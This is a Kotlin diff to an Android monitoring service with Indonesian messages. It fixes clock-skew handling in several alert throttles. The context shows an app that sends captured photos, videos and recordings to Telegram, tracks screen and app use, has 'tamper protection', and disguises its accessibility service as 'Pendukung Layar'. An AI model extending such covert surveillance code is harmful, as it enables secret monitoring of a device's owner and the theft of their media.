@@ -6024,7 +6024,9 @@ class MonitoringService : Service() {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.dataSaverNoticeAt
-            if (last <= 0L || now <= last || now - last >= 6 * 60 * 60_000L) {
+            if (last > now) {
+                preferencesManager.dataSaverNoticeAt = now
+            } else if (last <= 0L || now - last >= 6 * 60 * 60_000L) {
                 preferencesManager.dataSaverNoticeAt = now
                 sendToTelegram("📶 <b>Hemat kuota</b>: $pending foto/video/rekaman ditahan dulu, dikirim otomatis begitu tersambung Wi-Fi.")
             }
@@ -6052,6 +6054,10 @@ class MonitoringService : Service() {
         if (level < 0 || level > LOW_BATTERY_LEVEL) return
         val now = System.currentTimeMillis()
         val last = try { preferencesManager.batteryAlertAt } catch (_: Exception) { 0L }
+        if (last > now) {
+            try { preferencesManager.batteryAlertAt = now } catch (_: Exception) { }
+            return
+        }
         if (last <= now && now - last < 24 * 60 * 60_000L) return
         try { preferencesManager.batteryAlertAt = now } catch (_: Exception) { }
         val throttled = lowPowerActive()
@@ -8081,6 +8087,10 @@ class MonitoringService : Service() {
             if (policyError) autoPausePhotosOnPolicyBlock()
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastCameraErrorNotice
+            if (last > now) {
+                preferencesManager.lastCameraErrorNotice = now
+                return
+            }
             if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastCameraErrorNotice = now
             val hint = if (policyError) policyFailureHint(cameraBlockingAdmins()) else cameraFailureHint(clean)
@@ -8094,6 +8104,10 @@ class MonitoringService : Service() {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastUploadErrorNotice
+            if (last > now) {
+                preferencesManager.lastUploadErrorNotice = now
+                return
+            }
             if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastUploadErrorNotice = now
             sendToTelegram("⚠️ Unggah $jenis gagal (" + Html.escape(detail) + "). Akan dicoba otomatis.")
@@ -8377,6 +8391,10 @@ class MonitoringService : Service() {
             }
             val now = System.currentTimeMillis()
             val last = try { preferencesManager.a11yDisabledAlertAt } catch (_: Exception) { 0L }
+            if (last > now) {
+                try { preferencesManager.a11yDisabledAlertAt = now } catch (_: Exception) { }
+                return
+            }
             if (now >= last && now - last < 6 * 60 * 60_000L) return
             preferencesManager.a11yDisabledAlertAt = now
             sendToTelegram("\u267F <b>Aksesibilitas mati</b>\nPemakaian layar, pantau app, dan proteksi tamper berhenti. Buka Setup di perangkat \u2192 Aktifkan Aksesibilitas, lalu nyalakan lagi \"Pendukung Layar\".")
